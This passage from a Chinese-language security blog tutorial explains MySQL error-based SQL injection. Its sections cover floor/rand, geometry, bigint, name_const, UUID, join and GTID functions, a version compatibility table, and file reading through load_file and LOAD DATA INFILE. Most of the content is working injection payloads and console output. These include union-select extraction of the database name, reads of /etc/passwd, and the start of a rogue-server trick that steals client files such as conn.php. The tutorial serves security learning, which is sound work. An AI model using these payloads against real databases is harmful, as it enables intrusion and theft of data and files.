<h6 id="4-查询第三条记录，再次计算floor-rand-0-2-，发现结果为0-第4次计算-，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor-rand-0-2-被再次计算，作为虚表的主键，其值为1-第5次计算-，然而1这个主键已经存在于虚拟表中，而新计算的值也为1-主键键值必须唯一-，所以插入的时候就直接报错了。"><a href="#4-查询第三条记录，再次计算floor-rand-0-2-，发现结果为0-第4次计算-，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor-rand-0-2-被再次计算，作为虚表的主键，其值为1-第5次计算-，然而1这个主键已经存在于虚拟表中，而新计算的值也为1-主键键值必须唯一-，所以插入的时候就直接报错了。" class="headerlink" title="4.查询第三条记录，再次计算floor(rand(0)2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。"></a>4.查询第三条记录，再次计算floor(rand(0)2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</h6><h6 id="5-整个查询过程floor-rand-0-2-被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。"><a href="#5-整个查询过程floor-rand-0-2-被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。" class="headerlink" title="5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。"></a>5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</h6><h6 id="引自：——Mysql报错注入原理分析-count-、rand-、group-by"><a href="#引自：——Mysql报错注入原理分析-count-、rand-、group-by" class="headerlink" title="引自：——Mysql报错注入原理分析(count()、rand()、group by)"></a>引自：——<a href="http://drops.wooyun.org/tips/14312" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></h6><h6 id="payload用法-union-select-count-2-concat-39-39-select-database-39-39-floor-rand-2-as-a-from-information-schema-tables-group-by-a"><a href="#payload用法-union-select-count-2-concat-39-39-select-database-39-39-floor-rand-2-as-a-from-information-schema-tables-group-by-a" class="headerlink" title="payload用法: union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a"></a>payload用法: <code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></h6><h5 id="5-几何函数"><a href="#5-几何函数" class="headerlink" title="5.几何函数"></a>5.几何函数</h5><ul>
<li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li>
<li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li>
<li>multipoint()：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
<li>multilinestring()：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
<li>linestring()：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
<li>multipolygon() ：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li>
</ul>
<h5 id="6-不存在的函数"><a href="#6-不存在的函数" class="headerlink" title="6.不存在的函数"></a>6.不存在的函数</h5><h6 id="随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。例如："><a href="#随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。例如：" class="headerlink" title="随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。例如："></a>随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select a();</span><br><span class="line">ERROR 1305 (42000): FUNCTION shopping1.a does not exist</span><br></pre></td></tr></table></figure>

<h5 id="7-Bigint数值操作："><a href="#7-Bigint数值操作：" class="headerlink" title="7.Bigint数值操作："></a>7.Bigint数值操作：</h5><h6 id="当mysql数据库的某些边界数值进行数值运算时，会报错的原理。"><a href="#当mysql数据库的某些边界数值进行数值运算时，会报错的原理。" class="headerlink" title="当mysql数据库的某些边界数值进行数值运算时，会报错的原理。"></a>当mysql数据库的某些边界数值进行数值运算时，会报错的原理。</h6><h6 id="如-0得到的结果：18446744073709551615"><a href="#如-0得到的结果：18446744073709551615" class="headerlink" title="如~0得到的结果：18446744073709551615"></a>如~0得到的结果：18446744073709551615</h6><h6 id="若此数参与运算，则很容易会错误。"><a href="#若此数参与运算，则很容易会错误。" class="headerlink" title="若此数参与运算，则很容易会错误。"></a>若此数参与运算，则很容易会错误。</h6><h6 id="payload-select-select-from-select-user-a-0"><a href="#payload-select-select-from-select-user-a-0" class="headerlink" title="payload: select !(select * from(select user())a)-~0;"></a>payload: <code>select !(select * from(select user())a)-~0;</code></h6><h5 id="8-name-const"><a href="#8-name-const" class="headerlink" title="8.name_const()"></a>8.name_const()</h5><h6 id="仅可取数据库版本信息"><a href="#仅可取数据库版本信息" class="headerlink" title="仅可取数据库版本信息"></a>仅可取数据库版本信息</h6><h6 id="payload-select-from-select-name-const-version-0x1-name-const-version-0x1-a"><a href="#payload-select-from-select-name-const-version-0x1-name-const-version-0x1-a" class="headerlink" title="payload: select * from(select name_const(version(),0x1),name_const(version(),0x1))a"></a>payload: <code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></h6><h5 id="9-uuid相关函数"><a href="#9-uuid相关函数" class="headerlink" title="9.uuid相关函数"></a>9.uuid相关函数</h5><h6 id="适用版本：8-0-x"><a href="#适用版本：8-0-x" class="headerlink" title="适用版本：8.0.x"></a>适用版本：8.0.x</h6><h6 id="参数格式不正确。"><a href="#参数格式不正确。" class="headerlink" title="参数格式不正确。"></a>参数格式不正确。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));</span><br><span class="line">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span><br></pre></td></tr></table></figure>

<h5 id="10-join-using-注列名"><a href="#10-join-using-注列名" class="headerlink" title="10.join using()注列名"></a>10.join using()注列名</h5><h6 id="通过系统关键词join可建立两个表之间的内连接。"><a href="#通过系统关键词join可建立两个表之间的内连接。" class="headerlink" title="通过系统关键词join可建立两个表之间的内连接。"></a>通过系统关键词join可建立两个表之间的内连接。</h6><h6 id="通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因-相同列名存在-，而发生错误。"><a href="#通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因-相同列名存在-，而发生错误。" class="headerlink" title="通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。"></a>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</h6><h6 id="并且报错信息会存在重复的列名，可以使用-USING-表达式声明内连接（INNER-JOIN）条件来避免报错。"><a href="#并且报错信息会存在重复的列名，可以使用-USING-表达式声明内连接（INNER-JOIN）条件来避免报错。" class="headerlink" title="并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。"></a>并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure>

<h5 id="11-GTID相关函数"><a href="#11-GTID相关函数" class="headerlink" title="11.GTID相关函数"></a>11.GTID相关函数</h5><h6 id="参数格式不正确。-1"><a href="#参数格式不正确。-1" class="headerlink" title="参数格式不正确。"></a>参数格式不正确。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select gtid_subset(user(),1);</span><br><span class="line">mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">mysql&gt;select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure>

<h6 id="例如：-6"><a href="#例如：-6" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select gtid_subset(user(),1);</span><br><span class="line">ERROR 1772 (HY000): Malformed GTID set specification &apos;root@localhost&apos;.</span><br><span class="line">mysql&gt; select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">ERROR 1241 (21000): Operand should contain 1 column(s)</span><br><span class="line">mysql&gt; select gtid_subtract((select * from(select user())a),1);</span><br><span class="line">ERROR 1772 (HY000): Malformed GTID set specification &apos;root@localhost&apos;.</span><br></pre></td></tr></table></figure>

<h5 id="12-报错函数速查表"><a href="#12-报错函数速查表" class="headerlink" title="12.报错函数速查表"></a>12.报错函数速查表</h5><h6 id="注：默认MYSQL-ERRMSG-SIZE-512"><a href="#注：默认MYSQL-ERRMSG-SIZE-512" class="headerlink" title="注：默认MYSQL_ERRMSG_SIZE=512"></a>注：默认MYSQL_ERRMSG_SIZE=512</h6><table>
<thead>
<tr>
<th align="center">类别</th>
<th align="center">函数</th>
<th align="center">版本需求</th>
<th align="center">5.5.x</th>
<th align="center">5.6.x</th>
<th align="center">5.7.x</th>
<th align="center">8.x</th>
<th align="center">函数显错长度</th>
<th align="center">Mysql报错内容长度</th>
<th align="center">额外限制</th>
</tr>
</thead>
<tbody><tr>
<td align="center">主键重复</td>
<td align="center">floor round</td>
<td align="center">❓</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center">64</td>
<td align="center"></td>
<td align="center">data_type ≠ varchar</td>
</tr>
<tr>
<td align="center">列名重复</td>
<td align="center">name_const</td>
<td align="center">❓</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center"></td>
<td align="center">only version()</td>
</tr>
<tr>
<td align="center">列名重复</td>
<td align="center">join</td>
<td align="center">[5.5.49, ?)</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center"></td>
<td align="center">only columns</td>
</tr>
<tr>
<td align="center">数据溢出 - Double</td>
<td align="center">1e308 cot exp pow</td>
<td align="center">[5.5.5, 5.5.48]</td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">MYSQL_ERRMSG_SIZE</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">数据溢出 - BIGINT</td>
<td align="center">1+~0</td>
<td align="center">[5.5.5, 5.5.48]</td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">MYSQL_ERRMSG_SIZE</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">几何对象</td>
<td align="center">geometrycollection linestring multipoint multipolygon multilinestring polygon</td>
<td align="center">[?, 5.5.48]</td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">244</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">空间函数</td>
<td align="center">Geohash    ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td>
<td align="center">[5.7, ?)</td>
<td align="center"></td>
<td align="center"></td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">128</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">GTID</td>
<td align="center">gtid_subset gtid_subtract</td>
<td align="center">[5.6.5, ?)</td>
<td align="center"></td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">200</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">JSON</td>
<td align="center">json_*</td>
<td align="center">[5.7.8, 5.7.11]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center">✔</td>
<td align="center"></td>
<td align="center">200</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">UUID</td>
<td align="center">uuid_to_bin bin_to_uuid</td>
<td align="center">[8.0, ?)</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">✔</td>
<td align="center">128</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">XPath</td>
<td align="center">extractvalue updatexml</td>
<td align="center">[5.1.5, ?)</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">✔</td>
<td align="center">32</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h6 id="摘自——Mysql-注入基础小结"><a href="#摘自——Mysql-注入基础小结" class="headerlink" title="摘自——Mysql 注入基础小结"></a>摘自——<a href="https://blog.sari3l.com/posts/9622f295/" target="_blank" rel="noopener">Mysql 注入基础小结</a></h6><h4 id="0x07-文件读-写"><a href="#0x07-文件读-写" class="headerlink" title="0x07.文件读/写"></a>0x07.文件读/写</h4><h6 id="我们知道Mysql是很灵活的，它支持文件读-写功能。在讲这之前，有必要介绍下什么是file-priv和secure-file-priv。"><a href="#我们知道Mysql是很灵活的，它支持文件读-写功能。在讲这之前，有必要介绍下什么是file-priv和secure-file-priv。" class="headerlink" title="我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是file_priv和secure-file-priv。"></a>我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</h6><h6 id="file-pric是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下面的payload查看权限。"><a href="#file-pric是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下面的payload查看权限。" class="headerlink" title="file_pric是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下面的payload查看权限。"></a><code>file_pric</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下面的payload查看权限。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user=$USER host=$HOST;</span><br></pre></td></tr></table></figure>

<h6 id="例如：-7"><a href="#例如：-7" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select file_priv from mysql.user where user=&apos;root&apos; and host=&apos;localhost&apos;;</span><br><span class="line">+-----------+</span><br><span class="line">| file_priv |</span><br><span class="line">+-----------+</span><br><span class="line">| Y         |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="secure-file-priv是一个系统变量，对于文件读-写功能进行限制。具体如下："><a href="#secure-file-priv是一个系统变量，对于文件读-写功能进行限制。具体如下：" class="headerlink" title="secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下："></a><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</h6><ul>
<li>无内容，表示无限制。</li>
<li>为NULL，表示禁止文件读/写。</li>
<li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
</ul>
<h6 id="注：5-5-53本身及之后的版本默认值为NULL，之前的版本无内容。"><a href="#注：5-5-53本身及之后的版本默认值为NULL，之前的版本无内容。" class="headerlink" title="注：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。"></a>注：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。</h6><h6 id="三种方法查看当前secure-file-priv的值："><a href="#三种方法查看当前secure-file-priv的值：" class="headerlink" title="三种方法查看当前secure-file-priv的值："></a>三种方法查看当前<code>secure-file-priv</code>的值：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>

<h6 id="例如：-8"><a href="#例如：-8" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="修改："><a href="#修改：" class="headerlink" title="修改："></a>修改：</h6><ul>
<li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li>
<li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li>
</ul>
<h6 id="在my-ini中设置读写权限。"><a href="#在my-ini中设置读写权限。" class="headerlink" title="在my.ini中设置读写权限。"></a>在<code>my.ini</code>中设置读写权限。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line">loose-local-infile = 1</span><br><span class="line">secure-file-priv=</span><br><span class="line"># 设置3306端口</span><br><span class="line">port = 3306</span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir=D:\\mysql-8.0.18</span><br><span class="line"># 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错</span><br><span class="line"># datadir=C:\\web\\sqldata</span><br><span class="line"># password=-6FlP)yKb3js</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections=20</span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server=utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br></pre></td></tr></table></figure>

<h5 id="读"><a href="#读" class="headerlink" title="读"></a>读</h5><h6 id="Mysql读取文件通常使用load-file函数，语法如下："><a href="#Mysql读取文件通常使用load-file函数，语法如下：" class="headerlink" title="Mysql读取文件通常使用load_file函数，语法如下："></a>Mysql读取文件通常使用load_file函数，语法如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file_path);</span><br></pre></td></tr></table></figure>

<h6 id="例如：-9"><a href="#例如：-9" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(&apos;C:/Users/liangjie/Desktop/flag.txt&apos;);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| load_file(&apos;C:/Users/liangjie/Desktop/flag.txt&apos;) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| flag&#123;ljdd520&#125;                                   |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="注：在输入文件的绝对路径的时候，要用-来替换-，由于在mysql种-会被当做转换符来处理。"><a href="#注：在输入文件的绝对路径的时候，要用-来替换-，由于在mysql种-会被当做转换符来处理。" class="headerlink" title="注：在输入文件的绝对路径的时候，要用/来替换\，由于在mysql种\会被当做转换符来处理。"></a>注：在输入文件的绝对路径的时候，要用<code>/</code>来替换<code>\</code>，由于在mysql种<code>\</code>会被当做转换符来处理。</h6><h6 id="读第二种读取文件的方法："><a href="#读第二种读取文件的方法：" class="headerlink" title="读第二种读取文件的方法："></a>读第二种读取文件的方法：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &apos;\n&apos;; #读取服务端文件</span><br></pre></td></tr></table></figure>

<h6 id="例如：-10"><a href="#例如：-10" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE IF NOT EXISTS `test`(</span><br><span class="line">    -&gt;    `id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">    -&gt;    `content` VARCHAR(100) NOT NULL,</span><br><span class="line">    -&gt;    PRIMARY KEY ( `id` )</span><br><span class="line">    -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; load data infile &quot;C:/Users/liangjie/Desktop/flag.txt&quot; into table test FIELDS TERMINATED BY &apos;,&apos;;</span><br><span class="line">Query OK, 2 rows affected (0.01 sec)</span><br><span class="line">Records: 2  Deleted: 0  Skipped: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select *from test;</span><br><span class="line">+----+----------------+</span><br><span class="line">| id | content        |</span><br><span class="line">+----+----------------+</span><br><span class="line"> | 1 | flag&#123;ljdd520&#125;</span><br><span class="line">|  2 | flag&#123;lydd520&#125;  |</span><br><span class="line">+----+----------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><h6 id="https-blog-csdn-net-u014082714-article-details-53173975"><a href="#https-blog-csdn-net-u014082714-article-details-53173975" class="headerlink" title="https://blog.csdn.net/u014082714/article/details/53173975"></a><a href="https://blog.csdn.net/u014082714/article/details/53173975" target="_blank" rel="noopener">https://blog.csdn.net/u014082714/article/details/53173975</a></h6><h6 id="第三种读取文件的方法："><a href="#第三种读取文件的方法：" class="headerlink" title="第三种读取文件的方法："></a>第三种读取文件的方法：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &apos;\n&apos;; #读取客户端文件</span><br></pre></td></tr></table></figure>

<h6 id="例如：-11"><a href="#例如：-11" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data local infile &quot;C:/Users/liangjie/Desktop/flag.txt&quot; into table test FIELDS TERMINATED BY &apos;,&apos;;</span><br><span class="line">Query OK, 1 row affected, 2 warnings (0.01 sec)</span><br><span class="line">Records: 3  Deleted: 0  Skipped: 2  Warnings: 2</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">+----+----------------+</span><br><span class="line">| id | content        |</span><br><span class="line">+----+----------------+</span><br><span class="line"> | 1 | flag&#123;ljdd520&#125;</span><br><span class="line">|  2 | flag&#123;lydd520&#125;  |</span><br><span class="line">|  3 | flag&#123;ludd520&#125;  |</span><br><span class="line">+----+----------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="限制："><a href="#限制：" class="headerlink" title="限制："></a>限制：</h6><ul>
<li>前两种需要<code>secure-file-priv</code>无值或为有利目录。</li>
<li>都需要知道要读取的文件所在的绝对路径。</li>
<li>要读取的文件大小必须小于<code>max_allowed_packet</code>所设置的值</li>
</ul>
<h5 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h5><h6 id="5-5-53secure-file-priv-NULL读文件payload，mysql8测试失败-需要开启读写的权限-，其他版本自测。"><a href="#5-5-53secure-file-priv-NULL读文件payload，mysql8测试失败-需要开启读写的权限-，其他版本自测。" class="headerlink" title="5.5.53secure-file-priv=NULL读文件payload，mysql8测试失败(需要开启读写的权限)，其他版本自测。"></a>5.5.53<code>secure-file-priv=NULL</code>读文件payload，mysql8测试失败(需要开启读写的权限)，其他版本自测。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">drop table mysql.m1;</span><br><span class="line">CREATE TABLE mysql.m1 (code TEXT );</span><br><span class="line">LOAD DATA LOCAL INFILE &apos;D://1.txt&apos; INTO TABLE mysql.m1 fields terminated by &apos;&apos;;</span><br><span class="line">select * from mysql.m1;</span><br></pre></td></tr></table></figure>

<h5 id="Mysql连接数据库时可读取文件"><a href="#Mysql连接数据库时可读取文件" class="headerlink" title="Mysql连接数据库时可读取文件"></a>Mysql连接数据库时可读取文件</h5><h6 id="这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。"><a href="#这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。" class="headerlink" title="这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。"></a>这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。</h6><h6 id="简单描述该漏洞：Mysql客户端在执行load-data-local语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下："><a href="#简单描述该漏洞：Mysql客户端在执行load-data-local语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：" class="headerlink" title="简单描述该漏洞：Mysql客户端在执行load data local语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下："></a>简单描述该漏洞：Mysql客户端在执行<code>load data local</code>语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</h6><h6 id="原本的查询流程为"><a href="#原本的查询流程为" class="headerlink" title="原本的查询流程为"></a>原本的查询流程为</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我要把我的win.ini文件内容插入test表中</span><br><span class="line">服务端：好，我要你的win.ini文件内容</span><br><span class="line">客户端：win.ini的内容如下....</span><br></pre></td></tr></table></figure>

<p>####### 假设服务端由我们控制，把一个正常的流程篡改成如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我要把我的win.ini文件内容插入test表中</span><br><span class="line">服务端：好，我要你的conn.php内容</span><br><span class="line">客户端：conn.php的内容如下???</span><br></pre></td></tr></table></figure>

